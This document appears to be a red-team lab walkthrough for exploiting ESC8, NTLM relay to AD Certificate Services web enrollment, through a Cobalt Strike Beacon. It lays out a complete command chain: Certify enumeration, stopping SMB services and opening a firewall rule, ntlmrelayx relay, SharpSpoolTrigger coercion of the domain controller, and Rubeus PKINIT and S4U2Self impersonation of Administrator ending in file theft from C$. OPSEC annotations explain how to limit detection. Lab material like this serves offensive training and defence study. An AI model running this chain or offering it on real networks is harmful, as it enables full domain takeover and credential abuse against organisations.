# ESC8 NTLM Relay to ADCS HTTP Endpoints

>The objective of this lab is to identify and exploit ESC8.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Enumerate the certificate authority for vulnerabilities. 🔍

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
    ```

⚠️ This will show that *lon-cs-1* is vulnerable to ESC8.

===

## Relay Setup

1. Use Beacon to start a SOCKS proxy.
    1. `socks 1080 socks5`
    
2. Run `netstat` to see that port 445 is currently bound.

3. Set the *lanmanserver* service's start mode to *disabled* to prevent it from automatically restarting.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
    ```

4. Stop these services in the following order to unbind port 445.
    1. `sc_stop lanmanserver`
    2. `sc_stop srv2`
    3. `sc_stop srvnet`

⚠️ Run `netstat` and verify that 445 is no longer bound.

5. Start a reverse port forward that will bind to port 445 and redirect the traffic to *127.0.0.1:7445* on the attacker desktop.
	1. `rportfwd_local 445 localhost 7445`

⚠️ `netstat` will show 445 being bound again, but the PID will be that of the Beacon.

6. Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation.  Add the rule:

    ```Beacon-nocolor
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
    ```

===

## Relaying

1. On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
    1. `docker container start -i kali-1`

2. Configure proxychains to use Cobalt's SOCKS proxy.
    1. Open `/etc/proxychains.conf` in vim or nano.
    2. Scroll to the last line.
    3. Replace the default socks4 entry 💡  `socks5 10.0.0.5 1080`💡 
    4. Save the changes.

3. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint.  We're going to relay the credentials of a domain controller, so we'll specifically request a *DomainController* certificate.🕵️ Still in the kali linux Docker instance start `NTLMRelayX`

    ```bash
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```

4. While that is waiting, go back to Beacon.
5. Coerce the domain controller into authenticating to the current machine.

    ```Beacon-nocolor
    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    ```

⚠️ The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy.  A file called **LON-DC-1.pfx** should be created.

6. Press Ctrl+C to stop ntlmrelayx.

------

## Post-Exploitation — LON-DC-1.pfx → Domain Administrator

> **Perform these steps before Cleanup** while the SOCKS proxy is still active. The PFX is on the Kali Docker container. Two paths are documented: Kali Docker (PKINITtools/Certipy — no PFX transfer needed) and Windows Beacon (Rubeus — requires PFX transfer).

### Path — Windows Beacon (Rubeus — CS-native)

#### Step 1 — Copy certificate & Base64 encode PFX on attacker desktop

search Inside the kali container

```
find / -name "LON-DC-1.pfx" 2>/dev/null
```  

Copy certificate back to windows from docker kali image:
```
docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
```

Run in PowerShell on the attacker desktop:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
```

Copy the full output string.

#### Step 2 — Request TGT for DC machine account via PKINIT

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:<base64_pfx_string> /enctype:aes256 /nowrap
```

> **OPSEC-🟢SAFE (no disk write on target)** — Certificate is passed in-memory as a Rubeus argument; nothing written to the target filesystem. `execute-assembly` still spawns a sacrificial process (CAUTION tier). PKINIT AS-REQ generates **Event 4768** on DC. Note the base64 TGT from output.

#### Step 3 — S4U2Self to impersonate Administrator

Use the DC machine account TGT to perform S4U2Self, requesting a CIFS service ticket as Administrator to the DC. The `/self` flag specifies S4U2Self (no S4U2Proxy required — DC machine account is trusted for delegation to itself).

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt
```

> **OPSEC-🟠CAUTION** — Generates **Event 4769** (TGS-REQ S4U2Self) on DC. `/ptt` injects the resulting service ticket into the beacon's logon session in-memory — no disk write.

#### Step 4 — Prove DA Access

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-🟢SAFE** — SMB access via injected Kerberos ticket. Generates **Event 4624 Type 3** on DC only. No remote process spawn, no service creation.

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-🟢SAFE** — File read over existing beacon C2 channel. Generates **Event 4663** on DC if Object Access auditing is enabled.

---

### ESC8 Full Chain OPSEC Summary

| Stage | Action | OPSEC | Key Events |
|-------|--------|-------|------------|
| Enum | Certify enum-cas | OPSEC-🟠CAUTION | LDAP to DC (1644) |
| Relay setup | Stop lanmanserver / rportfwd | OPSEC-🟠CAUTION | Service control events (7036) |
| Coerce | SharpSpoolTrigger | OPSEC-🔴UNSAFE | Print spooler RPC — Event 4624 on target |
| Relay | ntlmrelayx → ADCS | OPSEC-🟠CAUTION | CA Events 4886/4887 — always logged |
| Prove DA | smbclient / ls C$ | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
| Cleanup | Restore services / firewall | OPSEC-🟢SAFE | Reduces forensic footprint |


## Cleanup

1. Stop the SOCKS proxy.
    1. `socks stop`

2. Stop the reverse port forward.
    1. `rportfwd stop 445`

3. Restore the services back to default.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    ```

    1. `sc_start srvnet`
    2. `sc_start srv2`
    3. `sc_start lanmanserver`

4. Remove the firewall rule.

    ```Beacon-nocolor
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
    ```

⚠️ This lab, you have learned how to identify and exploit ESC8 through a C2.

